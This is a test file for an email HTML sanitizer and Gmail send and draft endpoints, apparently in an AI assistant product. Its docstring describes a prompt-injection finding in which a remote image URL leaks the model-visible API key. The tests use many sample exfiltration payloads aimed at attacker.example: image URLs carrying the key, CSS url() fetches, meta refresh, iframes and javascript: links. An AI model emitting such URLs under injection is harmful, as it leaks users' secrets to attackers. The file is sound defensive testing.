"""Tests for ``sanitize_email_html()`` / ``convert_markdown_to_html()`` in
``api/gmail/helpers.py`` and the end-to-end guarantee that the no-approval
``/api/gmail-simple/send-self`` route never ships HTML that references a
remote resource (finding #279227: a prompt-injected remote image URL carrying
the model-visible Quest API key would be fetched by Gmail's image proxy when
the user opens the self-email).

Policy under test: an ``<img>`` survives only with a ``cid:`` source (an
attachment of the message itself); every external reference is removed.
"""

from __future__ import annotations

import base64
from email import policy
from email.parser import BytesParser
from html.parser import HTMLParser

from fastapi.testclient import TestClient

from api.gmail.helpers import convert_markdown_to_html, sanitize_email_html


class _ImgSrcCollector(HTMLParser):
    def __init__(self):
        super().__init__()
        self.srcs: list[str] = []

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "img":
            self.srcs.append(dict(attrs).get("src", ""))


def _img_srcs(html: str) -> list[str]:
    p = _ImgSrcCollector()
    p.feed(html)
    return p.srcs


# ---------------------------------------------------------------------------
# Image policy
# ---------------------------------------------------------------------------

class TestImagePolicy:
    def test_markdown_remote_image_degrades_to_alt_text(self):
        html = convert_markdown_to_html("![chart](https://attacker.example/p.png?k=SECRET)")
        assert "attacker.example" not in html
        assert "SECRET" not in html
        assert _img_srcs(html) == []
        assert html == "<p>chart</p>"

    def test_remote_image_without_alt_disappears(self):
        assert convert_markdown_to_html("![](https://attacker.example/p.png)") == "<p></p>"

    def test_cid_image_is_kept(self):
        html = convert_markdown_to_html("![chart](cid:chart.png)")
        assert _img_srcs(html) == ["cid:chart.png"]
        assert 'alt="chart"' in html

    def test_cid_scheme_is_case_insensitive_and_whitespace_tolerant(self):
        assert _img_srcs(sanitize_email_html('<img src=" CID:x ">')) == [" CID:x "]

    def test_raw_html_img_is_stripped(self):
        html = convert_markdown_to_html('<img src="https://attacker.example/2.png" alt="pic">')
        assert "attacker.example" not in html
        assert html == "<p>pic</p>"

    def test_uppercase_raw_img_is_stripped(self):
        html = sanitize_email_html('<IMG SRC="HTTPS://attacker.example/5">')
        assert "attacker.example" not in html

    def test_data_and_protocol_relative_srcs_are_rejected(self):
        for src in ("data:image/png;base64,AAAA", "//attacker.example/x.png", "/x.png", "x.png"):
            assert _img_srcs(sanitize_email_html(f'<img src="{src}">')) == [], src

    def test_srcset_is_dropped_even_on_cid_image(self):
        html = sanitize_email_html('<img src="cid:i" srcset="https://attacker.example/7 1x">')
        assert html == '<img src="cid:i" />'


# ---------------------------------------------------------------------------
# Other fetch vectors and active content
# ---------------------------------------------------------------------------

class TestOtherFetchVectors:
    def test_style_attribute_is_dropped(self):
        html = sanitize_email_html('<div style="background:url(https://attacker.example/3)">hi</div>')
        assert html == "<div>hi</div>"

    def test_style_element_is_dropped_with_content(self):
        html = sanitize_email_html("<style>body{background:url(https://attacker.example/4)}</style>text")
        assert html == "text"

    def test_script_is_dropped_with_content(self):
        assert sanitize_email_html("<script>alert(1)</script>after") == "after"

    def test_link_and_meta_tags_are_removed(self):
        html = sanitize_email_html(
            '<link rel="stylesheet" href="https://attacker.example/c.css">'
            '<meta http-equiv="refresh" content="0;url=https://attacker.example">x'
        )
        assert html == "x"

    def test_svg_image_is_dropped(self):
        assert sanitize_email_html('<svg><image href="https://attacker.example/8"/></svg>t') == "t"

    def test_conditional_comment_is_dropped(self):
        html = sanitize_email_html('<!--[if mso]><img src="https://attacker.example/6"><![endif]-->x')
        assert html == "x"

    def test_iframe_object_embed_are_dropped(self):
        html = sanitize_email_html(
            '<iframe src="https://attacker.example"></iframe>'
            '<object data="https://attacker.example"></object>'
            '<embed src="https://attacker.example">y'
        )
        assert html == "y"

    def test_event_handlers_and_ids_are_dropped(self):
        html = sanitize_email_html('<a href="https://ok.example" onclick="x()" id="q">l</a>')
        assert html == '<a href="https://ok.example">l</a>'

    def test_unknown_tags_are_unwrapped_keeping_text(self):
        assert sanitize_email_html("<marquee><font color=red>hi</font></marquee>") == "hi"


# ---------------------------------------------------------------------------
# Links
# ---------------------------------------------------------------------------

class TestLinks:
    def test_http_https_mailto_kept(self):
        html = convert_markdown_to_html(
            "[a](http://x.example) [b](https://y.example/p?q=1) [c](mailto:me@x.example)"
        )
        assert 'href="http://x.example"' in html
        assert 'href="https://y.example/p?q=1"' in html
        assert 'href="mailto:me@x.example"' in html

    def test_javascript_href_dropped_text_kept(self):
        html = convert_markdown_to_html("[x](javascript:alert(1))")
        assert html == "<p><a>x</a></p>"

    def test_data_href_dropped(self):
        assert sanitize_email_html('<a href="data:text/html,x">y</a>') == "<a>y</a>"

    def test_relative_and_fragment_hrefs_kept(self):
        assert sanitize_email_html('<a href="#top">t</a>') == '<a href="#top">t</a>'


# ---------------------------------------------------------------------------
# Formatting markdown produces must survive
# ---------------------------------------------------------------------------

class TestFormattingPreserved:
    def test_headings_paragraph_breaks_lists(self):
        html = convert_markdown_to_html("# Heading\n\nline1\nline2\n\n1. one\n2. two\n\n- a\n- b")
        assert "<h1>Heading</h1>" in html
        assert "line1<br />\nline2" in html
        assert "<ol>" in html and "<ul>" in html and html.count("<li>") == 4

    def test_table(self):
        html = convert_markdown_to_html("| a | b |\n|---|---|\n| 1 | 2 |")
        assert "<table>" in html and "<th>a</th>" in html and "<td>2</td>" in html

    def test_fenced_code_keeps_language_class_and_escapes(self):
        html = convert_markdown_to_html("```python\nx = 1 < 2\n```")
        assert html == '<pre><code class="language-python">x = 1 &lt; 2\n</code></pre>'

    def test_text_is_escaped(self):
        assert convert_markdown_to_html("a < b & c > d") == "<p>a &lt; b &amp; c &gt; d</p>"

    def test_inline_emphasis_and_hr(self):
        html = convert_markdown_to_html("**bold** *em* `code`\n\n---")
        assert "<strong>bold</strong>" in html and "<em>em</em>" in html
        assert "<code>code</code>" in html and "<hr />" in html

    def test_table_cell_alignment_kept(self):
        html = convert_markdown_to_html("| a |\n|:--|\n| 1 |")
        assert 'style="text-align: left;"' not in html  # style always dropped
        assert "<th>a</th>" in html or 'align="left"' in html

    def test_empty(self):
        assert convert_markdown_to_html("") == ""
        assert sanitize_email_html("") == ""


# ---------------------------------------------------------------------------
# End-to-end: the no-approval self-send route ships sanitized HTML
# ---------------------------------------------------------------------------

class _CapturingGmailService:
    def __init__(self):
        self.sent_bodies = []

    def users(self):
        return self

    def messages(self):
        return self

    def send(self, *, userId, body):
        assert userId == "me"
        self.sent_bodies.append(body)
        return self

    def execute(self):
        return {"id": "sent-id", "threadId": "thread-id"}


def _decode_sent_mime(captured_body: dict):
    raw = captured_body["raw"]
    padded = raw + "=" * (-len(raw) % 4)
    return BytesParser(policy=policy.default).parsebytes(base64.urlsafe_b64decode(padded))


def test_send_self_route_strips_remote_image_carrying_api_key(monkeypatch):
    import api.gmail.draft_endpoints as draft_endpoints
    from chat.sandbox_api import create_sandbox_app

    victim = {"id": 101, "email": "victim@example.com", "api_key": "quest_live_secret_12345"}
    attacker_img = "https://attacker.example/pixel.png?quest_api_key=" + victim["api_key"]
    body_md = f"Here is the summary.\n\n![invoice preview]({attacker_img})\n\nThanks."

    gmail_service = _CapturingGmailService()

    async def fake_current_user():
        return victim

    async def fake_credentials(user):
        return object()

    monkeypatch.setattr(draft_endpoints, "get_valid_service_credentials", fake_credentials)
    monkeypatch.setattr(draft_endpoints, "get_gmail_service", lambda credentials: gmail_service)

    app = create_sandbox_app()
    app.dependency_overrides[draft_endpoints.get_current_user] = fake_current_user

    response = TestClient(app).post(
        "/api/gmail-simple/send-self",
        json={"subject": "summary", "body_md": body_md},
        headers={"Authorization": "Bearer " + victim["api_key"]},
    )
    assert response.status_code == 200, response.text
    assert len(gmail_service.sent_bodies) == 1

    sent = _decode_sent_mime(gmail_service.sent_bodies[0])
    html = sent.get_body(preferencelist=("html",)).get_content()
    assert _img_srcs(html) == []
    assert "attacker.example" not in html
    assert victim["api_key"] not in html
    assert "invoice preview" in html  # alt text survives as a caption


# ---------------------------------------------------------------------------
# Inline images: attachments get a Content-ID the body can reference
# ---------------------------------------------------------------------------

from api.gmail.helpers import attachment_content_id, is_inline_image_mime  # noqa: E402


class TestAttachmentContentId:
    def test_plain_filename_unchanged(self):
        assert attachment_content_id("chart.png") == "chart.png"

    def test_unsafe_runs_become_underscore(self):
        assert attachment_content_id("my chart (final).png") == "my_chart_final_.png"
        assert attachment_content_id("<a>b") == "_a_b"

    def test_empty_falls_back(self):
        assert attachment_content_id("") == "attachment"
        assert attachment_content_id("   ") == "attachment"

    def test_inline_image_mime(self):
        assert is_inline_image_mime("image/png")
        assert is_inline_image_mime("IMAGE/JPEG")
        assert not is_inline_image_mime("application/pdf")
        assert not is_inline_image_mime("")


class _CapturingDraftService:
    def __init__(self):
        self.created = []

    def users(self):
        return self

    def drafts(self):
        return self

    def create(self, *, userId, body):
        assert userId == "me"
        self.created.append(body)
        return self

    def execute(self):
        return {"id": "draft-id", "message": {"id": "m", "threadId": "t", "labelIds": ["DRAFT"]}}


def test_gmail_draft_attached_image_renders_inline_via_cid(monkeypatch):
    """An attached image gets Content-ID + inline disposition, the body's
    ``cid:`` reference survives sanitization, and the result reports the
    content_id so the model can build the reference."""
    import api.gmail.draft_endpoints as draft_endpoints
    from chat.sandbox_api import create_sandbox_app

    user = {"id": 7, "email": "me@example.com", "api_key": "k"}
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 16

    async def fake_current_user():
        return user

    async def fake_credentials(u):
        return object()

    async def fake_workspace(conversation_id, workspace_path, filename_override=None,
                             project_id=None):
        assert workspace_path == "output/my chart.png"
        return {"data": png, "filename": "my chart.png", "mime_type": "image/png"}

    async def fake_owned(user_id, conversation_id):
        assert user_id == user["id"] and conversation_id == "conv-1"
        return {"id": conversation_id, "project_id": None}

    service = _CapturingDraftService()
    monkeypatch.setattr(draft_endpoints, "get_valid_service_credentials", fake_credentials)
    monkeypatch.setattr(draft_endpoints, "get_gmail_service", lambda c: service)
    monkeypatch.setattr(draft_endpoints, "_resolve_workspace_attachment", fake_workspace)
    monkeypatch.setattr(draft_endpoints, "require_owned_conversation", fake_owned)

    app = create_sandbox_app()
    app.dependency_overrides[draft_endpoints.get_current_user] = fake_current_user

    body_md = (
        "Trend:\n\n![Weekly trend](cid:my_chart.png)\n\n"
        "![remote](https://attacker.example/x.png)"
    )
    response = TestClient(app).post(
        "/api/gmail-simple/drafts",
        json={
            "to": "you@example.com",
            "subject": "chart",
            "body_md": body_md,
            "conversation_id": "conv-1",
            "attachments": [{"type": "workspace", "workspace_path": "output/my chart.png"}],
        },
        headers={"Authorization": "Bearer k"},
    )
    assert response.status_code == 200, response.text
    assert response.json()["attachments"] == [
        {"filename": "my chart.png", "content_id": "my_chart.png", "inline_image": True}
    ]

    raw = service.created[0]["message"]["raw"]
    msg = BytesParser(policy=policy.default).parsebytes(
        base64.urlsafe_b64decode(raw + "=" * (-len(raw) % 4))
    )
    html = msg.get_body(preferencelist=("html",)).get_content()
    assert _img_srcs(html) == ["cid:my_chart.png"]
    assert "attacker.example" not in html

    images = [p for p in msg.walk() if p.get_content_type() == "image/png"]
    assert len(images) == 1
    assert images[0]["Content-ID"] == "<my_chart.png>"
    assert images[0].get_content_disposition() == "inline"
    assert images[0].get_filename() == "my chart.png"
    assert images[0].get_payload(decode=True) == png


def test_send_self_attached_image_renders_inline_via_cid(monkeypatch):
    """send_gmail_to_self accepts the draft attachment shapes: the attached
    image is embedded via ``cid:`` while a remote image is still stripped,
    and workspace attachments are ownership-checked against the caller."""
    import api.gmail.draft_endpoints as draft_endpoints
    from chat.sandbox_api import create_sandbox_app

    user = {"id": 7, "email": "me@example.com", "api_key": "k"}
    png = b"\x89PNG\r\n\x1a\n" + b"\x00" * 16
    csv = b"a,b\n1,2\n"

    async def fake_current_user():
        return user

    async def fake_credentials(u):
        return object()

    async def fake_workspace(conversation_id, workspace_path, filename_override=None,
                             project_id=None):
        assert conversation_id == "conv-1"
        if workspace_path == "output/chart.png":
            return {"data": png, "filename": "chart.png", "mime_type": "image/png"}
        return {"data": csv, "filename": "data.csv", "mime_type": "text/csv"}

    owned_calls = []

    async def fake_owned(user_id, conversation_id):
        owned_calls.append((user_id, conversation_id))
        return {"id": conversation_id, "project_id": None}

    service = _CapturingGmailService()
    monkeypatch.setattr(draft_endpoints, "get_valid_service_credentials", fake_credentials)
    monkeypatch.setattr(draft_endpoints, "get_gmail_service", lambda c: service)
    monkeypatch.setattr(draft_endpoints, "_resolve_workspace_attachment", fake_workspace)
    monkeypatch.setattr(draft_endpoints, "require_owned_conversation", fake_owned)

    app = create_sandbox_app()
    app.dependency_overrides[draft_endpoints.get_current_user] = fake_current_user

    body_md = (
        "Trend:\n\n![Weekly trend](cid:chart.png)\n\n"
        "![remote](https://attacker.example/x.png?k=k)"
    )
    response = TestClient(app).post(
        "/api/gmail-simple/send-self",
        json={
            "subject": "chart",
            "body_md": body_md,
            "conversation_id": "conv-1",
            "attachments": [
                {"type": "workspace", "workspace_path": "output/chart.png"},
                {"type": "workspace", "workspace_path": "output/data.csv"},
            ],
        },
        headers={"Authorization": "Bearer k"},
    )
    assert response.status_code == 200, response.text
    assert owned_calls == [(7, "conv-1")]
    payload = response.json()
    assert payload["to"] == "me@example.com"
    assert payload["subject"] == "[Quest] chart"
    assert payload["attachments"] == [
        {"filename": "chart.png", "content_id": "chart.png", "inline_image": True},
        {"filename": "data.csv", "content_id": "data.csv", "inline_image": False},
    ]

    sent = _decode_sent_mime(service.sent_bodies[0])
    html = sent.get_body(preferencelist=("html",)).get_content()
    assert _img_srcs(html) == ["cid:chart.png"]
    assert "attacker.example" not in html

    images = [p for p in sent.walk() if p.get_content_type() == "image/png"]
    assert len(images) == 1
    assert images[0]["Content-ID"] == "<chart.png>"
    assert images[0].get_content_disposition() == "inline"
    assert images[0].get_payload(decode=True) == png

    files = [p for p in sent.walk() if p.get_content_type() == "text/csv"]
    assert len(files) == 1
    assert files[0].get_content_disposition() == "attachment"
    assert files[0].get_payload(decode=True) == csv


def test_send_self_workspace_attachment_requires_conversation_id(monkeypatch):
    """A script-path call (no conversation context) cannot attach workspace
    files; nothing is sent."""
    import api.gmail.draft_endpoints as draft_endpoints
    from chat.sandbox_api import create_sandbox_app

    user = {"id": 7, "email": "me@example.com", "api_key": "k"}

    async def fake_current_user():
        return user

    async def fake_credentials(u):
        return object()

    service = _CapturingGmailService()
    monkeypatch.setattr(draft_endpoints, "get_valid_service_credentials", fake_credentials)
    monkeypatch.setattr(draft_endpoints, "get_gmail_service", lambda c: service)

    app = create_sandbox_app()
    app.dependency_overrides[draft_endpoints.get_current_user] = fake_current_user

    response = TestClient(app).post(
        "/api/gmail-simple/send-self",
        json={
            "subject": "chart",
            "body_md": "x",
            "attachments": [{"type": "workspace", "workspace_path": "output/chart.png"}],
        },
        headers={"Authorization": "Bearer k"},
    )
    assert response.status_code == 400
    assert "conversation_id is required" in response.text
    assert service.sent_bodies == []


def test_gmail_draft_non_image_attachment_keeps_attachment_disposition(monkeypatch):
    import api.gmail.draft_endpoints as draft_endpoints
    from chat.sandbox_api import create_sandbox_app

    user = {"id": 7, "email": "me@example.com", "api_key": "k"}

    async def fake_current_user():
        return user

    async def fake_credentials(u):
        return object()

    async def fake_workspace(conversation_id, workspace_path, filename_override=None,
                             project_id=None):
        return {"data": b"a,b\n1,2\n", "filename": "results.csv", "mime_type": "text/csv"}

    async def fake_owned(user_id, conversation_id):
        assert user_id == user["id"] and conversation_id == "conv-1"
        return {"id": conversation_id, "project_id": None}

    service = _CapturingDraftService()
    monkeypatch.setattr(draft_endpoints, "get_valid_service_credentials", fake_credentials)
    monkeypatch.setattr(draft_endpoints, "get_gmail_service", lambda c: service)
    monkeypatch.setattr(draft_endpoints, "_resolve_workspace_attachment", fake_workspace)
    monkeypatch.setattr(draft_endpoints, "require_owned_conversation", fake_owned)

    app = create_sandbox_app()
    app.dependency_overrides[draft_endpoints.get_current_user] = fake_current_user

    response = TestClient(app).post(
        "/api/gmail-simple/drafts",
        json={
            "to": "you@example.com", "subject": "csv", "body_md": "Attached.",
            "conversation_id": "conv-1",
            "attachments": [{"type": "workspace", "workspace_path": "output/results.csv"}],
        },
        headers={"Authorization": "Bearer k"},
    )
    assert response.status_code == 200, response.text
    assert response.json()["attachments"][0] == {
        "filename": "results.csv", "content_id": "results.csv", "inline_image": False,
    }
    raw = service.created[0]["message"]["raw"]
    msg = BytesParser(policy=policy.default).parsebytes(
        base64.urlsafe_b64decode(raw + "=" * (-len(raw) % 4))
    )
    csv_part = [p for p in msg.walk() if p.get_content_type() == "text/csv"][0]
    assert csv_part["Content-ID"] == "<results.csv>"
    assert csv_part.get_content_disposition() == "attachment"
